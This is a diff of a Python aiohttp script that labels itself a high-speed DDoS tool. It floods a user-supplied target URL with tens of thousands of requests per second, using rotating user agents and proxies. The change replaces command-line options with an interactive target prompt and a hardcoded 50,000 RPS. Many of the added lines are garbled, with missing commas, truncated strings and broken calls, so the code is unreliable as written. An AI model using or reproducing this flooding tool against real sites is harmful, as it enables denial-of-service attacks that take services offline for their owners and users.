@@ -3,7 +3,6 @@ import aiohttp
 import random
 import signal
 from fake_useragent import UserAgent
-import argparse
 from datetime import datetime
 
 # Biến toàn cục
@@ -52,52 +51,40 @@ async def worker(session, sem, url, proxies):
                     method,
                     url,
                     headers=headers,
-                    params=params,
-                    data=data,
+                    params=params                    data=data,
                     proxy=proxy,
                     timeout=aiohttp.ClientTimeout(total=5)
                 ) as response:
                     duration = (datetime.now() - start_time).total_seconds()
                     print(f"[{method}] {response.status} | {duration:.2f}s | {url}")
             except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-                print(f"[!] Lỗi: {e}")
+                print(f"[!]ỗi: {e}")
             except Exception as e:
                 print(f"[!] Lỗi bất thường: {e}")
 
 # Hàm chính
 async def main():
-    parser = argparse.ArgumentParser(description="Công cụ DDoS cao tốc (10k-100k RPS)")
-    parser.add_argument("--url", required=True, help="URL mục tiêu (http://example.com)")
-    parser.add_argument("--rps", type=int, default=10000, help="Requests per second (10k-100k)")
-    parser.add_argument("--total", type=int, default=0, help="Tổng số request (0 = vô hạn)")
-    parser.add_argument("--workers", type=int, default=200, help="Số luồng đồng thời")
-    parser.add_argument("--proxies", nargs="*", default=[], help="Danh sách proxy (http://ip:port)")
-    args = parser.parse_args()
+    # Nhập URL từ người dùng
+    url = input("Nhap URL muc tieu (http://example.com): ").strip()
+    if not url("http        url = "http://" + url
 
-    print(f"[+] Bắt đầu tấn công vào {args.url}")
-    print(f"[+] Mục tiêu: {args.rps} RPS | Tổng: {args.total} request | Proxy: {len(args.proxies)}")
+    print(f"[+] Bắt đầu tấn công vào {url}")
+    print(f"[+] Mục tiêu: 50.000 RPS (mặc định | Tổng: 0 (vô hạn) | Proxy: 0")
 
     # Tạo connector để tối ưu kết nối
-    connector = aiohttp.TCPConnector(limit_per_host=0, ssl=False, force_close=False)
+    connector = aiohttp.TCPConnector(limit_per_host=0, ssl=False, force=False)
     timeout = aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=5)
 
     # Tạo session
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        # Tạo semaphore để kiểm soát tốc độ
-        sem = asyncio.Semaphore(args.rps // 10)  # 10% concurrency safety
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) session:
+        # Tạo semaphore để kiểm tốc độ (50k RPS)
+        sem = asyncio.Semaphore(5000)  # 50k RPS = 5000 lu đồng thời
 
-        # Tạo các task worker
-        tasks = [worker(session, sem, args.url, args.proxies) for _ in range(args.workers)]
+        # Tạo các task worker (500 luồng)
+        tasks = [worker(session, sem, url, for _ in range(500)]
 
-        # Đếm request nếu có total
-        if args.total > 0:
-            counter = 0
-            while counter < args.total and not STOP_FLAG:
-                await asyncio.sleep(1)
-                counter += args.rps
-                print(f"[+] Đã gửi: {counter} / {args.total}")
-        else:
-            await asyncio.gather(*tasks)
+        # Chạy luồng
+ await asyncio.gather(*tasks)
 
 # Chạy ứng dụng
 if __name__ == "__main__":
